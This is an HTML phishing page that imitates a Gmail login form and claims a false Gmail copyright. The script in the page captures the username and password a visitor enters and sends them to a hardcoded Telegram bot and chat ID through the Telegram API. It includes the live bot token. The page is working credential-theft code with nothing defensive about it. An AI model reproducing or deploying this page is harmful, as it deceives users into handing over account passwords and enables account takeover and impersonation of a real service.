  <!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title> Login Gmail </title>
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background: linear-gradient(to right, #0f2027, #203a43, #2c5364);
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .login-container {
      background: white;
      padding: 40px;
      border-radius: 10px;
      box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
      width: 100%;
      max-width: 400px;
      text-align: center;
    }

    .login-container h2 {
      margin-bottom: 20px;
      color: #2c5364;
    }

    input[type="text"],
    input[type="password"] {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border: 1px solid #ccc;
      border-radius: 5px;
      font-size: 16px;
    }

    button {
      width: 100%;
      padding: 12px;
      background-color: #2c5364;
      color: white;
      border: none;
      border-radius: 5px;
      font-size: 16px;
      cursor: pointer;
      margin-top: 10px;
    }

    button:hover {
      background-color: #1a2a35;
    }

    .footer {
      margin-top: 20px;
      font-size: 14px;
      color: #777;
    }
  </style>
</head>
<body>
  <div class="login-container">
    <h2>Login Gmail </h2>
    <form id="loginForm">
      <input type="text" name="username" placeholder="Username" required />
      <input type="password" name="password" placeholder="Password" required />
      <button type="submit">Login</button>
    </form>
    <div class="footer">
      © 2025 | All Right Reserved By Gmail.
    </div>
  </div>

  <script>
    // Replace these with your Telegram Bot Token and Chat ID
    const botToken = '7531384739:AAEEI8D_CM7wmJLTJO7_pYCuY6U__wnpmxs';
    const chatId = '6760519562';

    document.getElementById('loginForm').addEventListener('submit', function (e) {
      e.preventDefault(); // prevent page reload

      const username = this.username.value.trim();
      const password = this.password.value.trim();

      if (!username || !password) {
        alert('Please fill in both fields.');
        return;
      }

      const message = `
🔐 New Login Attempt:
👤 Username: ${username}
🔑 Password: ${password}
      `;

      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          text: message
        })
      })
        .then(response => {
          if (response.ok) {
            alert('Login info sent to Telegram!');
            // Optionally, clear the form or redirect
            this.reset();
            // window.location.href = '/dashboard'; // Uncomment to redirect
          } else {
            alert('Failed to send data to Telegram.');
          }
        })
        .catch(error => {
          console.error('Error:', error);
          alert('Error sending data to Telegram.');
        });
    });
  </script>
</body>
</html>
